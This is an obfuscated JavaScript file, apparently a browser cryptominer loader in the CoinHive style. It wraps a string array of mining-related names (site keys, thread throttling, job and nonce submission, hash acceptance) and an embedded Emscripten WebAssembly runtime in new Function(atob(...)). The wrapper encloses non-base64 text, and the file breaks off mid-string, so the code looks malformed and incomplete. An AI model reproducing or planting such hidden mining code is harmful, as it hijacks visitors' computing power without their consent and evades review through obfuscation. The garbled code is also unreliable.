new Function(atob("var _0x89d9 = [
  "getAcceptedHashes",
  "getToken",
  "_eventListeners",
  "push",
  "getAutoThreadsEnabled",
  "enabled",
  "setAutoThreadsEnabled",
  "adjustAt",
  "adjustEvery",
  "_adjustThreads",
  "getThrottle",
  "setThrottle",
  "setNumThreads",
  "JobThread",
  "setJob",
  "pop",
  "WebAssembly",
  "isRunning",
  "FORCE_MULTI_TAB",
  "_updateTabs",
  "verifyThread",
  "_auth",
  "Auth",
  "theme",
  "auth",
  "optin",
  "_emit",
  "error",
  "_connect",
  "_otherTabRunning",
  "getItem",
  "parse",
  "ident",
  "grace",
  "setItem",
  "stringify",
  "getNumThreads",
  "stats",
  "_hashString",
  "charCodeAt",
  "_onMessage",
  "onerror",
  "_onError",
  "onclose",
  "_onClose",
  "onopen",
  "_onOpen",
  "type",
  "user",
  "toString",
  "goal",
  "opt_in",
  "_send",
  "connection_error",
  "code",
  "close",
  "data",
  "job",
  "_setJob",
  "verify",
  "hash_accepted",
  "hashes",
  "accepted",
  "authed",
  "token",
  "CH\x20Error:",
  "invalid_site_key",
  "invalid_opt_in",
  "_stopOnInvalidOptIn",
  "reset",
  "banned",
  "found",
  "job_id",
  "submit",
  "nonce",
  "result",
  "_onVerified",
  "verified",
  "ifExclusiveTab",
  "FORCE_EXCLUSIVE_TAB",
  "forceExclusiveTab",
  "forceMultiTab",
  "Anonymous",
  "worker",
  "onReady",
  "currentJob",
  "jobCallback",
  "verifyCallback",
  "_isReady",
  "ready",
  "Expecting\x20first\x20message\x20to\x20be\x20\x22ready\x22,\x20got\x20",
  "onReceiveMsg",
  "verify_id",
  "running",
  "postMessage",
  "var\x20Module={locateFile:(function(path){return\x20\x22",
  "\x22+path})};var\x20Module;if(!Module)Module=(typeof\x20Module!==\x22undefined\x22?Module:null)||{};var\x20moduleOverrides={};for(var\x20key\x20in\x20Module){if(Module.hasOwnProperty(key)){moduleOverrides[key]=Module[key]}}var\x20ENVIRONMENT_IS_WEB=false;var\x20ENVIRONMENT_IS_WORKER=false;var\x20ENVIRONMENT_IS_NODE=false;var\x20ENVIRONMENT_IS_SHELL=false;if(Module[\x22ENVIRONMENT\x22]){if(Module[\x22ENVIRONMENT\x22]===\x22WEB\x22){ENVIRONMENT_IS_WEB=true}else\x20if(Module[\x22ENVIRONMENT\x22]===\x22WORKER\x22){ENVIRONMENT_IS_WORKER=true}else\x20if(Module[\x22ENVIRONMENT\x22]===\x22NODE\x22){ENVIRONMENT_IS_NODE=true}else\x20if(Module[\x22ENVIRONMENT\x22]===\x22SHELL\x22){ENVIRONMENT_IS_SHELL=true}else{throw\x20new\x20Error(\x22The\x20provided\x20Module[\x27ENVIRONMENT\x27]\x20value\x20is\x20not\x20valid.\x20It\x20must\x20be\x20one\x20of:\x20WEB|WORKER|NODE|SHELL.\x22)}}else{ENVIRONMENT_IS_WEB=typeof\x20window===\x22object\x22;ENVIRONMENT_IS_WORKER=typeof\x20importScripts===\x22function\x22;ENVIRONMENT_IS_NODE=typeof\x20process===\x22object\x22&&typeof\x20require===\x22function\x22&&!ENVIRONMENT_IS_WEB&&!ENVIRONMENT_IS_WORKER;ENVIRONMENT_IS_SHELL=!ENVIRONMENT_IS_WEB&&!ENVIRONMENT_IS_NODE&&!ENVIRONMENT_IS_WORKER}if(ENVIRONMENT_IS_NODE){if(!Module[\x22print\x22])Module[\x22print\x22]=console.log;if(!Module[\x22printErr\x22])Module[\x22printErr\x22]=console.warn;var\x20nodeFS;var\x20nodePath;Module[\x22read\x22]=function\x20shell_read(filename,binary){if(!nodeFS)nodeFS=require(\x22fs\x22);if(!nodePath)nodePath=require(\x22path\x22);filename=nodePath[\x22normalize\x22](filename);var\x20ret=nodeFS[\x22readFileSync\x22](filename);return\x20binary?ret:ret.toString()};Module[\x22readBinary\x22]=function\x20readBinary(filename){var\x20ret=Module[\x22read\x22](filename,true);if(!ret.buffer){ret=new\x20Uint8Array(ret)}assert(ret.buffer);return\x20ret};Module[\x22load\x22]=function\x20load(f){globalEval(read(f))};if(!Module[\x22thisProgram\x22]){if(process[\x22argv\x22].length>1){Module[\x22thisProgram\x22]=process[\x22argv\x22][1].replace(/\x5c\x5c/g,\x22/\x22)}else{Module[\x22thisProgram\x22]=\x22unknown-program\x22}}Module[\x22arguments\x22]=process[\x22argv\x22].slice(2);if(typeof\x20module!==\x22undefined\x22){module[\x22exports\x22]=Module}process[\x22on\x22](\x22uncaughtException\x22,(function(ex){if(!(ex\x20instanceof\x20ExitStatus)){throw\x20ex}}));Module[\x22inspect\x22]=(function(){return\x22[Emscripten\x20Module\x20object]\x22})}else\x20if(ENVIRONMENT_IS_SHELL){if(!Module[\x22print\x22])Module[\x22print\x22]=print;if(typeof\x20printErr!=\x22undefined\x22)Module[\x22printErr\x22]=printErr;if(typeof\x20read!=\x22undefined\x22){Module[\x22read\x22]=read}else{Module[\x22read\x22]=function\x20shell_read(){throw\x22no\x20read()\x20available\x22}}Module[\x22readBinary\x22]=function\x20readBinary(f){if(typeof\x20readbuffer===\x22function\x22){return\x20new\x20Uint8Array(readbuffer(f))}var\x20data=read(f,\x22binary\x22);assert(typeof\x20data===\x22object\x22);return\x20data};if(typeof\x20scriptArgs!=\x22undefined\x22){Module[\x22arguments\x22]=scriptArgs}else\x20if(typeof\x20arguments!=\x22undefined\x22){Module[\x22arguments\x22]=arguments}if(typeof\x20quit===\x22function\x22){Module[\x22quit\x22]=(function(status,toThrow){quit(status)})}}else\x20if(ENVIRONMENT_IS_WEB||ENVIRONMENT_IS_WORKER){Module[\x22read\x22]=function\x20shell_read(url){var\x20xhr=new\x20XMLHttpRequest;xhr.open(\x22GET\x22,url,false);xhr.send(null);return\x20xhr.responseText};if(ENVIRONMENT_IS_WORKER){Module[\x22readBinary\x22]=function\x20readBinary(url){var\x20xhr=new\x20XMLHttpRequest;xhr.open(\x22GET\x22,url,false);xhr.responseType=\x22arraybuffer\x22;xhr.send(null);return\x20new\x20Uint8Array(xhr.response)}}Module[\x22readAsync\x22]=function\x20readAsync(url,onload,onerror){var\x20xhr=new\x20XMLHttpRequest;xhr.open(\x22GET\x22,url,true);xhr.responseType=\x22arraybuffer\x22;xhr.onload=function\x20xhr_onload(){if(xhr.status==200||xhr.status==0&&xhr.response){onload(xhr.response)}else{onerror()}};xhr.onerror=onerror;xhr.send(null)};if(typeof\x20arguments!=\x22undefined\x22){Module[\x22arguments\x22]=arguments}if(typeof\x20console!==\x22undefined\x22){if(!Module[\x22print\x22])Module[\x22print\x22]=function\x20shell_print(x){console.log(x)};if(!Module[\x22printErr\x22])Module[\x22printErr\x22]=function\x20shell_printErr(x){console.warn(x)}}else{var\x20TRY_USE_DUMP=false;if(!Module[\x22print\x22])Module[\x22print\x22]=TRY_USE_DUMP&&typeof\x20dump!==\x22undefined\x22?(function(x){dump(x)}):(function(x){})}if(ENVIRONMENT_IS_WORKER){Module[\x22load\x22]=importScripts}if(typeof\x20Module[\x22setWindowTitle\x22]===\x22undefined\x22){Module[\x22setWindowTitle\x22]=(function(title){document.title=title})}}else{throw\x22Unknown\x20runtime\x20environment.\x20Where\x20are\x20we?\x22}function\x20globalEval(x){eval.call(null,x)}if(!Module[\x22load\x22]&&Module[\x22read\x22]){Module[\x22load\x22]=function\x20load(f){globalEval(Module[\x22read\x22](f))}}if(!Module[\x22print\x22]){Module[\x22print\x22]=(function(){})}if(!Module[\x22printErr\x22]){Module[\x22printErr\x22]=Module[\x22print\x22]}if(!Module[\x22arguments\x22]){Module[\x22arguments\x22]=[]}if(!Module[\x22thisProgram\x22]){Module[\x22thisProgram\x22]=\x22./this.program\x22}if(!Module[\x22quit\x22]){Module[\x22quit\x22]=(function(status,toThrow){throw\x20toThrow})}Module.print=Module[\x22print\x22];Module.printErr=Module[\x22printErr\x22];Module[\x22preRun\x22]=[];Module[\x22postRun\x22]=[];for(var\x20key\x20in\x20moduleOverrides){if(moduleOverrides.hasOwnProperty(key)){Module[key]=moduleOverrides[key]}}moduleOverrides=undefined;var\x20Runtime={setTempRet0:(function(value){tempRet0=value;return\x20value}),getTempRet0:(function(){return\x20tempRet0}),stackSave:(function(){return\x20STACKTOP}),stackRestore:(function(stackTop){STACKTOP=stackTop}),getNativeTypeSize:(function(type){switch(type){case\x22i1\x22:case\x22i8\x22:return\x201;case\x22i16\x22:return\x202;case\x22i32\x22:return\x204;case\x22i64\x22:return\x208;case\x22float\x22:return\x204;case\x22double\x22:return\x208;default:{if(type[type.length-1]===\x22*\x22){return\x20Runtime.QUANTUM_SIZE}else\x20if(type[0]===\x22i\x22){var\x20bits=parseInt(type.substr(1));assert(bits%8===0);return\x20bits/8}else{return\x200}}}}),getNativeFieldSize:(function(type){return\x20Math.max(Runtime.getNativeTypeSize(type),Runtime.QUANTUM_SIZE)}),STACK_ALIGN:16,prepVararg:(function(ptr,type){if(type===\x22double\x22||type===\x22i64\x22){if(ptr&7){assert((ptr&7)===4);ptr+=4}}else{assert((ptr&3)===0)}return\x20ptr}),getAlignSize:(function(type,size,vararg){if(!vararg&&(type==\x22i64\x22||type==\x22double\x22))return\x208;if(!type)return\x20Math.min(size,8);return\x20Math.min(size||(type?Runtime.getNativeFieldSize(type):0),Runtime.QUANTUM_SIZE)}),dynCall:(function(sig,ptr,args){if(args&&args.length){return\x20Module[\x22dynCall_\x22+sig].apply(null,[ptr].concat(args))}else{return\x20Module[\x22dynCall_\x22+sig].call(null,ptr)}}),functionPointers:[],addFunction:(function(func){for(var\x20i=0;i<Runtime.functionPointers.length;i++){if(!Runtime.functionPointers[i]){Runtime.functionPointers[i]=func;return\x202*(1+i)}}throw\x22Finished\x20up\x20all\x20reserved\x20function\x20pointers.\x20Use\x20a\x20higher\x20value\x20for\x20RESERVED_FUNCTION_POINTERS.\x22}),removeFunction:(function(index){Runtime.functionPointers[(index-2)/2]=null}),warnOnce:(function(text){if(!Runtime.warnOnce.shown)Runtime.warnOnce.shown={};if(!Runtime.warnOnce.shown[text]){Runtime.warnOnce.shown[text]=1;Module.printErr(text)}}),funcWrappers:{},getFuncWrapper:(function(func,sig){assert(sig);if(!Runtime.funcWrappers[sig]){Runtime.funcWrappers[sig]={}}var\x20sigCache=Runtime.funcWrappers[sig];if(!sigCache[func]){if(sig.length===1){sigCache[func]=function\x20dynCall_wrapper(){return\x20Runtime.dynCall(sig,func)}}else\x20if(sig.length===2){sigCache[func]=function\x20dynCall_wrapper(arg){return\x20Runtime.dynCall(sig,func,[arg])}}else{sigCache[func]=function\x20dynCall_wrapper(){return\x20Runtime.dynCall(sig,func,Array.prototype.slice.call(arguments))}}}return\x20sigCache[func]}),getCompilerSetting:(function(name){throw\x22You\x20must\x20build\x20with\x20-s\x20RETAIN_COMPILER_SETTINGS=1\x20for\x20Runtime.getCompilerSetting\x20or\x20emscripten_get_compiler_setting\x20to\x20work\x22}),stackAlloc:(function(size){var\x20ret=STACKTOP;STACKTOP=STACKTOP+size|0;STACKTOP=STACKTOP+15&-16;return\x20ret}),staticAlloc:(function(size){var\x20ret=STATICTOP;STATICTOP=STATICTOP+size|0;STATICTOP=STATICTOP+15&-16;return\x20ret}),dynamicAlloc:(function(size){var\x20ret=HEAP32[DYNAMICTOP_PTR>>2];var\x20end=(ret+size+15|0)&-16;HEAP32[DYNAMICTOP_PTR>>2]=end;if(end>=TOTAL_MEMORY){var\x20success=enlargeMemory();if(!success){HEAP32[DYNAMICTOP_PTR>>2]=ret;return\x200}}return\x20ret}),alignMemory:(function(size,quantum){var\x20ret=size=Math.ceil(size/(quantum?quantum:16))*(quantum?quantum:16);return\x20ret}),makeBigInt:(function(low,high,unsigned){var\x20ret=unsigned?+(low>>>0)+\x20+(high>>>0)*4294967296:+(low>>>0)+\x20+(high|0)*4294967296;return\x20ret}),GLOBAL_BASE:1024,QUANTUM_SIZE:4,__dummy__:0};Module[\x22Runtime\x22]=Runtime;var\x20ABORT=0;var\x20EXITSTATUS=0;function\x20assert(condition,text){if(!condition){abort(\x22Assertion\x20failed:\x20\x22+text)}}function\x20getCFunc(ident){var\x20func=Module[\x22_\x22+ident];if(!func){try{func=eval(\x22_\x22+ident)}catch(e){}}assert(func,\x22Cannot\x20call\x20unknown\x20function\x20\x22+ident+\x22\x20(perhaps\x20LLVM\x20optimizations\x20or\x20closure\x20removed\x20it?)\x22);return\x20func}var\x20cwrap,ccall;((function(){var\x20JSfuncs={\x22stackSave\x22:(function(){Runtime.stackSave()}),\x22stackRestore\x22:(function(){Runtime.stackRestore()}),\x22arrayToC\x22:(function(arr){var\x20ret=Runtime.stackAlloc(arr.length);writeArrayToMemory(arr,ret);return\x20ret}),\x22stringToC\x22:(function(str){var\x20ret=0;if(str!==null&&str!==undefined&&str!==0){var\x20len=(str.length<<2)+1;ret=Runtime.stackAlloc(len);stringToUTF8(str,ret,len)}return\x20ret})};var\x20toC={\x22string\x22:JSfuncs[\x22stringToC\x22],\x22array\x22:JSfuncs[\x22arrayToC\x22]};ccall=function\x20ccallFunc(ident,returnType,argTypes,args,opts){var\x20func=getCFunc(ident);var\x20cArgs=[];var\x20stack=0;if(args){for(var\x20i=0;i<args.length;i++){var\x20converter=toC[argTypes[i]];if(converter){if(stack===0)stack=Runtime.stackSave();cArgs[i]=converter(args[i])}else{cArgs[i]=args[i]}}}var\x20ret=func.apply(null,cArgs);if(returnType===\x22string\x22)ret=Pointer_stringify(ret);if(stack!==0){if(opts&&opts.async){EmterpreterAsync.asyncFinalizers.push((function(){Runtime.stackRestore(stack)}));return}Runtime.stackRestore(stack)}return\x20ret};var\x20sourceRegex=/^function\x5cs*[a-zA-Z$_0-9]*\x5cs*\x5c(([^)]*)\x5c)\x5cs*{\x5cs*([^*]*?)[\x5cs;]*(?:return\x5cs*(.*?)[;\x5cs]*)?}$/;function\x20parseJSFunc(jsfunc){var\x20parsed=jsfunc.toString().match(sourceRegex).slice(1);return{arguments:parsed[0],body:parsed[1],returnValue:parsed[2]}}var\x20JSsource=null;function\x20ensureJSsource(){if(!JSsource){JSsource={};for(var\x20fun\x20in\x20JSfuncs){if(JSfuncs.hasOwnProperty(fun)){JSsource[fun]=parseJSFunc(JSfuncs[fun])}}}}cwrap=function\x20cwrap(ident,returnType,argTypes){argTypes=argTypes||[];var\x20cfunc=getCFunc(ident);var\x20numericArgs=argTypes.every((function(type){return\x20type===\x22number\x22}));var\x20numericRet=returnType!==\x22string\x22;if(numericRet&&numericArgs){return\x20cfunc}var\x20argNames=argTypes.map((function(x,i){return\x22$\x22+i}));var\x20funcstr=\x22(function(\x22+argNames.join(\x22,\x22)+\x22)\x20{\x22;var\x20nargs=argTypes.length;if(!numericArgs){ensureJSsource();funcstr+=\x22var\x20stack\x20=\x20\x22+JSsource[\x22stackSave\x22].body+\x22;\x22;for(var\x20i=0;i<nargs;i++){var\x20arg=argNames[i],type=argTypes[i];if(type===\x22number\x22)continue;var\x20convertCode=JSsource[type+\x22ToC\x22];funcstr+=\x22var\x20\x22+convertCode.arguments+\x22\x20=\x20\x22+arg+\x22;\x22;funcstr+=convertCode.body+\x22;\x22;funcstr+=arg+\x22=(\x22+convertCode.returnValue+\x22);\x22}}var\x20cfuncname=parseJSFunc((function(){return\x20cfunc})).returnValue;funcstr+=\x22var\x20ret\x20=\x20\x22+cfuncname+\x22(\x22+argNames.join(\x22,\x22)+\x22);\x22;if(!numericRet){var\x20strgfy=parseJSFunc((function(){return\x20Pointer_stringify})).returnValue;funcstr+=\x22ret\x20=\x20\x22+strgfy+\x22(ret);\x22}if(!numericArgs){ensureJSsource();funcstr+=JSsource[\x22stackRestore\x22].body.replace(\x22()\x22,\x22(stack)\x22)+\x22;\x22}funcstr+=\x22return\x20ret})\x22;return\x20eval(funcstr)}}))();Module[\x22ccall\x22]=ccall;Module[\x22cwrap\x22]=cwrap;function\x20setValue(ptr,value,type,noSafe){type=type||\x22i8\x22;if(type.charAt(type.length-1)===\x22*\x22)type=\x22i32\x22;switch(type){case\x22i1\x22:HEAP8[ptr>>0]=value;break;case\x22i8\x22:HEAP8[ptr>>0]=value;break;case\x22i16\x22:HEAP16[ptr>>1]=value;break;case\x22i32\x22:HEAP32[ptr>>2]=value;break;case\x22i64\x22:tempI64=[value>>>0,(tempDouble=value,+Math_abs(tempDouble)>=1?tempDouble>0?(Math_min(+Math_floor(tempDouble/4294967296),4294967295)|0)>>>0:~~+Math_ceil((tempDouble-\x20+(~~tempDouble>>>0))/4294967296)>>>0:0)],HEAP32[ptr>>2]=tempI64[0],HEAP32[ptr+4>>2]=tempI64[1];break;case\x22float\x22:HEAPF32[ptr>>2]=value;break;case\x22double\x22:HEAPF64[ptr>>3]=value;break;default:abort(\x22invalid\x20type\x20for\x20setValue:\x20\x22+type)}}Module[\x22setValue\x22]=setValue;function\x20getValue(ptr,type,noSafe){type=type||\x22i8\x22;if(type.charAt(type.length-1)===\x22*\x22)type=\x22i32\x22;switch(type){case\x22i1\x22:return\x20HEAP8[ptr>>0];case\x22i8\x22:return\x20HEAP8[ptr>>0];case\x22i16\x22:return\x20HEAP16[ptr>>1];case\x22i32\x22:return\x20HEAP32[ptr>>2];case\x22i64\x22:return\x20HEAP32[ptr>>2];case\x22float\x22:return\x20HEAPF32[ptr>>2];case\x22double\x22:return\x20HEAPF64[ptr>>3];default:abort(\x22invalid\x20type\x20for\x20setValue:\x20\x22+type)}return\x20null}Module[\x22getValue\x22]=getValue;var\x20ALLOC_NORMAL=0;var\x20ALLOC_STACK=1;var\x20ALLOC_STATIC=2;var\x20ALLOC_DYNAMIC=3;var\x20ALLOC_NONE=4;Module[\x22ALLOC_NORMAL\x22]=ALLOC_NORMAL;Module[\x22ALLOC_STACK\x22]=ALLOC_STACK;Module[\x22ALLOC_STATIC\x22]=ALLOC_STATIC;Module[\x22ALLOC_DYNAMIC\x22]=ALLOC_DYNAMIC;Module[\x22ALLOC_NONE\x22]=ALLOC_NONE;function\x20allocate(slab,types,allocator,ptr){var\x20zeroinit,size;if(typeof\x20slab===\x22number\x22){zeroinit=true;size=slab}else{zeroinit=false;size=slab.length}var\x20singleType=typeof\x20types===\x22string\x22?types:null;var\x20ret;if(allocator==ALLOC_NONE){ret=ptr}else{ret=[typeof\x20_malloc===\x22function\x22?_malloc:Runtime.staticAlloc,Runtime.stackAlloc,Runtime.staticAlloc,Runtime.dynamicAlloc][allocator===undefined?ALLOC_STATIC:allocator](Math.max(size,singleType?1:types.length))}if(zeroinit){var\x20ptr=ret,stop;assert((ret&3)==0);stop=ret+(size&~3);for(;ptr<stop;ptr+=4){HEAP32[ptr>>2]=0}stop=ret+size;while(ptr<stop){HEAP8[ptr++>>0]=0}return\x20ret}if(singleType===\x22i8\x22){if(slab.subarray||slab.slice){HEAPU8.set(slab,ret)}else{HEAPU8.set(new\x20Uint8Array(slab),ret)}return\x20ret}var\x20i=0,type,typeSize,previousType;while(i<size){var\x20curr=slab[i];if(typeof\x20curr===\x22function\x22){curr=Runtime.getFunctionIndex(curr)}type=singleType||types[i];if(type===0){i++;continue}if(type==\x22i64\x22)type=\x22i32\x22;setValue(ret+i,curr,type);if(previousType!==type){typeSize=Runtime.getNativeTypeSize(type);previousType=type}i+=typeSize}return\x20ret}Module[\x22allocate\x22]=allocate;function\x20getMemory(size){if(!staticSealed)return\x20Runtime.staticAlloc(size);if(!runtimeInitialized)return\x20Runtime.dynamicAlloc(size);return\x20_malloc(size)}Module[\x22getMemory\x22]=getMemory;function\x20Pointer_stringify(ptr,length){if(length===0||!ptr)return\x22\x22;var\x20hasUtf=0;var\x20t;var\x20i=0;while(1){t=HEAPU8[ptr+i>>0];hasUtf|=t;if(t==0&&!length)break;i++;if(length&&i==length)break}if(!length)length=i;var\x20ret=\x22\x22;if(hasUtf<128){var\x20MAX_CHUNK=1024;var\x20curr;while(length>0){curr=String.fromCharCode.apply(String,HEAPU8.subarray(ptr,ptr+Math.min(length,MAX_CHUNK)));ret=ret?ret+curr:curr;ptr+=MAX_CHUNK;length-=MAX_CHUNK}return\x20ret}return\x20Module[\x22UTF8ToString\x22](ptr)}Module[\x22Pointer_stringify\x22]=Pointer_stringify;function\x20AsciiToString(ptr){var\x20str=\x22\x22;while(1){var\x20ch=HEAP8[ptr++>>0];if(!ch)return\x20str;str+=String.fromCharCode(ch)}}Module[\x22AsciiToString\x22]=AsciiToString;function\x20stringToAscii(str,outPtr){return\x20writeAsciiToMemory(str,outPtr,false)}Module[\x22stringToAscii\x22]=stringToAscii;var\x20UTF8Decoder=typeof\x20TextDecoder!==\x22undefined\x22?new\x20TextDecoder(\x22utf8\x22):undefined;function\x20UTF8ArrayToString(u8Array,idx){var\x20endPtr=idx;while(u8Array[endPtr])++endPtr;if(endPtr-idx>16&&u8Array.subarray&&UTF8Decoder){return\x20UTF8Decoder.decode(u8Array.subarray(idx,endPtr))}else{var\x20u0,u1,u2,u3,u4,u5;var\x20str=\x22\x22;while(1){u0=u8Array[idx++];if(!u0)return\x20str;if(!(u0&128)){str+=String.fromCharCode(u0);continue}u1=u8Array[idx++]&63;if((u0&224)==192){str+=String.fromCharCode((u0&31)<<6|u1);continue}u2=u8Array[idx++]&63;if((u0&240)==224){u0=(u0&15)<<12|u1<<6|u2}else{u3=u8Array[idx++]&63;if((u0&248)==240){u0=(u0&7)<<18|u1<<12|u2<<6|u3}else{u4=u8Array[idx++]&63;if((u0&252)==248){u0=(u0&3)<<24|u1<<18|u2<<12|u3<<6|u4}else{u5=u8Array[idx++]&63;u0=(u0&1)<<30|u1<<24|u2<<18|u3<<12|u4<<6|u5}}}if(u0<65536){str+=String.fromCharCode(u0)}else{var\x20ch=u0-65536;str+=String.fromCharCode(55296|ch>>10,56320|ch&1023)}}}}Module[\x22UTF8ArrayToString\x22]=UTF8ArrayToString;function\x20UTF8ToString(ptr){return\x20UTF8ArrayToString(HEAPU8,ptr)}Module[\x22UTF8ToString\x22]=UTF8ToString;function\x20stringToUTF8Array(str,outU8Array,outIdx,maxBytesToWrite){if(!(maxBytesToWrite>0))return\x200;var\x20startIdx=outIdx;var\x20endIdx=outIdx+maxBytesToWrite-1;for(var\x20i=0;i<str.length;++i){var\x20u=str.charCodeAt(i);if(u>=55296&&u<=57343)u=65536+((u&1023)<<10)|str.charCodeAt(++i)&1023;if(u<=127){if(outIdx>=endIdx)break;outU8Array[outIdx++]=u}else\x20if(u<=2047){if(outIdx+1>=endIdx)break;outU8Array[outIdx++]=192|u>>6;outU8Array[outIdx++]=128|u&63}else\x20if(u<=65535){if(outIdx+2>=endIdx)break;outU8Array[outIdx++]=224|u>>12;outU8Array[outIdx++]=128|u>>6&63;outU8Array[outIdx++]=128|u&63}else\x20if(u<=2097151){if(outIdx+3>=endIdx)break;outU8Array[outIdx++]=240|u>>18;outU8Array[outIdx++]=128|u>>12&63;outU8Array[outIdx++]=128|u>>6&63;outU8Array[outIdx++]=128|u&63}else\x20if(u<=67108863){if(outIdx+4>=endIdx)break;outU8Array[outIdx++]=248|u>>24;outU8Array[outIdx++]=128|u>>18&63;outU8Array[outIdx++]=128|u>>12&63;outU8Array[outIdx++]=128|u>>6&63;outU8Array[outIdx++]=128|u&63}else{if(outIdx+5>=endIdx)break;outU8Array[outIdx++]=252|u>>30;outU8Array[outIdx++]=128|u>>24&63;outU8Array[outIdx++]=128|u>>18&63;outU8Array[outIdx++]=128|u>>12&63;outU8Array[outIdx++]=128|u>>6&63;outU8Array[outIdx++]=128|u&63}}outU8Array[outIdx]=0;return\x20outIdx-startIdx}Module[\x22stringToUTF8Array\x22]=stringToUTF8Array;function\x20stringToUTF8(str,outPtr,maxBytesToWrite){return\x20stringToUTF8Array(str,HEAPU8,outPtr,maxBytesToWrite)}Module[\x22stringToUTF8\x22]=stringToUTF8;function\x20lengthBytesUTF8(str){var\x20len=0;for(var\x20i=0;i<str.length;++i){var\x20u=str.charCodeAt(i);if(u>=55296&&u<=57343)u=65536+((u&1023)<<10)|str.charCodeAt(++i)&1023;if(u<=127){++len}else\x20if(u<=2047){len+=2}else\x20if(u<=65535){len+=3}else\x20if(u<=2097151){len+=4}else\x20if(u<=67108863){len+=5}else{len+=6}}return\x20len}Module[\x22lengthBytesUTF8\x22]=lengthBytesUTF8;var\x20UTF16Decoder=typeof\x20TextDecoder!==\x22undefined\x22?new\x20TextDecoder(\x22utf-16le\x22):undefined;function\x20demangle(func){var\x20__cxa_demangle_func=Module[\x22___cxa_demangle\x22]||Module[\x22__cxa_demangle\x22];if(__cxa_demangle_func){try{var\x20s=func.substr(1);var\x20len=lengthBytesUTF8(s)+1;var\x20buf=_malloc(len);stringToUTF8(s,buf,len);var\x20status=_malloc(4);var\x20ret=__cxa_demangle_func(buf,0,0,status);if(getValue(status,\x22i32\x22)===0&&ret){return\x20Pointer_stringify(ret)}}catch(e){}finally{if(buf)_free(buf);if(status)_free(status);if(ret)_free(ret)}return\x20func}Runtime.warnOnce(\x22warning:\x20build\x20with\x20-s\x20DEMANGLE_SUPPORT=1\x20to\x20link\x20in\x20libcxxabi\x20demangling\x22);return\x20func}function\x20demangleAll(text){var\x20regex=/__Z[\x5cw\x5cd_]+/g;return\x20text.replace(regex,(function(x){var\x20y=demangle(x);return\x20x===y?x:x+\x22\x20[\x22+y+\x22]\x22}))}function\x20jsStackTrace(){var\x20err=new\x20Error;if(!err.stack){try{throw\x20new\x20Error(0)}catch(e){err=e}if(!err.stack){return\x22(no\x20stack\x20trace\x20available)\x22}}return\x20err.stack.toString()}function\x20stackTrace(){var\x20js=jsStackTrace();if(Module[\x22extraStackTrace\x22])js+=\x22\x5cn\x22+Module[\x22extraStackTrace\x22]();return\x20demangleAll(js)}Module[\x22stackTrace\x22]=stackTrace;var\x20WASM_PAGE_SIZE=65536;var\x20ASMJS_PAGE_SIZE=16777216;function\x20alignUp(x,multiple){if(x%multiple>0){x+=multiple-x%multiple}return\x20x}var\x20HEAP,buffer,HEAP8,HEAPU8,HEAP16,HEAPU16,HEAP32,HEAPU32,HEAPF32,HEAPF64;function\x20updateGlobalBuffer(buf){Module[\x22buffer\x22]=buffer=buf}function\x20updateGlobalBufferViews(){Module[\x22HEAP8\x22]=HEAP8=new\x20Int8Array(buffer);Module[\x22HEAP16\x22]=HEAP16=new\x20Int16Array(buffer);Module[\x22HEAP32\x22]=HEAP32=new\x20Int32Array(buffer);Module[\x22HEAPU8\x22]=HEAPU8=new\x20Uint8Array(buffer);Module[\x22HEAPU16\x22]=HEAPU16=new\x20Uint16Array(buffer);Module[\x22HEAPU32\x22]=HEAPU32=new\x20Uint32Array(buffer);Module[\x22HEAPF32\x22]=HEAPF32=new\x20Float32Array(buffer);Module[\x22HEAPF64\x22]=HEAPF64=new\x20Float64Array(buffer)}var\x20STATIC_BASE,STATICTOP,staticSealed;var\x20STACK_BASE,STACKTOP,STACK_MAX;var\x20DYNAMIC_BASE,DYNAMICTOP_PTR;STATIC_BASE=STATICTOP=STACK_BASE=STACKTOP=STACK_MAX=DYNAMIC_BASE=DYNAMICTOP_PTR=0;staticSealed=false;function\x20abortOnCannotGrowMemory(){abort(\x22Cannot\x20enlarge\x20memory\x20arrays.\x20Either\x20(1)\x20compile\x20with\x20-s\x20TOTAL_MEMORY=X\x20with\x20X\x20higher\x20than\x20the\x20current\x20value\x20\x22+TOTAL_MEMORY+\x22,\x20(2)\x20compile\x20with\x20-s\x20ALLOW_MEMORY_GROWTH=1\x20which\x20allows\x20increasing\x20the\x20size\x20at\x20runtime,\x20or\x20(3)\x20if\x20you\x20want\x20malloc\x20to\x20return\x20NULL\x20(0)\x20instead\x20of\x20this\x20abort,\x20compile\x20with\x20-s\x20ABORTING_MALLOC=0\x20\x22)}function\x20enlargeMemory(){abortOnCannotGrowMemory()}var\x20TOTAL_STACK=Module[\x22TOTAL_STACK\x22]||5242880;var\x20TOTAL_MEMORY=Module[\x22TOTAL_MEMORY\x22]||16777216;if(TOTAL_MEMORY<TOTAL_STACK)Module.printErr(\x22TOTAL_MEMORY\x20should\x20be\x20larger\x20than\x20TOTAL_STACK,\x20was\x20\x22+TOTAL_MEMORY+\x22!\x20(TOTAL_STACK=\x22+TOTAL_STACK+\x22)\x22);if(Module[\x22buffer\x22]){buffer=Module[\x22buffer\x22]}else{if(typeof\x20WebAssembly===\x22object\x22&&typeof\x20WebAssembly.Memory===\x22function\x22){Module[\x22wasmMemory\x22]=new\x20WebAssembly.Memory({\x22initial\x22:TOTAL_MEMORY/WASM_PAGE_SIZE,\x22maximum\x22:TOTAL_MEMORY/WASM_PAGE_SIZE});buffer=Module[\x22wasmMemory\x22].buffer}else{buffer=new\x20ArrayBuffer(TOTAL_MEMORY)}}updateGlobalBufferViews();function\x20getTotalMemory(){return\x20TOTAL_MEMORY}HEAP32[0]=1668509029;HEAP16[1]=25459;if(HEAPU8[2]!==115||HEAPU8[3]!==99)throw\x22Runtime\x20error:\x20expected\x20the\x20system\x20to\x20be\x20little-endian!\x22;Module[\x22HEAP\x22]=HEAP;Module[\x22buffer\x22]=buffer;Module[\x22HEAP8\x22]=HEAP8;Module[\x22HEAP16\x22]=HEAP16;Module[\x22HEAP32\x22]=HEAP32;Module[\x22HEAPU8\x22]=HEAPU8;Module[\x22HEAPU16\x22]=HEAPU16;Module[\x22HEAPU32\x22]=HEAPU32;Module[\x22HEAPF32\x22]=HEAPF32;Module[\x22HEAPF64\x22]=HEAPF64;function\x20callRuntimeCallbacks(callbacks){while(callbacks.length>0){var\x20callback=callbacks.shift();if(typeof\x20callback==\x22function\x22){callback();continue}var\x20func=callback.func;if(typeof\x20func===\x22number\x22){if(callback.arg===undefined){Module[\x22dynCall_v\x22](func)}else{Module[\x22dynCall_vi\x22](func,callback.arg)}}else{func(callback.arg===undefined?null:callback.arg)}}}var\x20__ATPRERUN__=[];var\x20__ATINIT__=[];var\x20__ATMAIN__=[];var\x